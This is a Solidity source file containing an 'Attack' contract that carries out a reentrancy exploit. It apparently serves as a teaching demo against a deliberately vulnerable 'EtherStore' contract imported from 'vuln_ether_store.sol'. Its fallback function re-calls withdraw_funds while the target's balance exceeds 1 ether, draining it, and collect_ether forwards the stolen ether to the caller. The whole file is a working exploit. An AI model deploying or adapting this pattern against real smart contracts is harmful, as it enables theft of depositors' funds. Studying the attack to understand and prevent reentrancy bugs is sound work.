// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.0;

import "./vuln_ether_store.sol";


contract Attack {

    EtherStore public ether_store;

    constructor(address ether_store_address) {
        ether_store = EtherStore(ether_store_address);
    }

    function attack_ether_store() public payable {
        require(msg.value >= 1 ether);
        ether_store.deposit_funds{value: 1 ether}();
        ether_store.withdraw_funds(1 ether);
    }

    function collect_ether() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(ether_store).balance > 1 ether){
            ether_store.withdraw_funds(1 ether);
        }
    }

    receive() external payable {}
}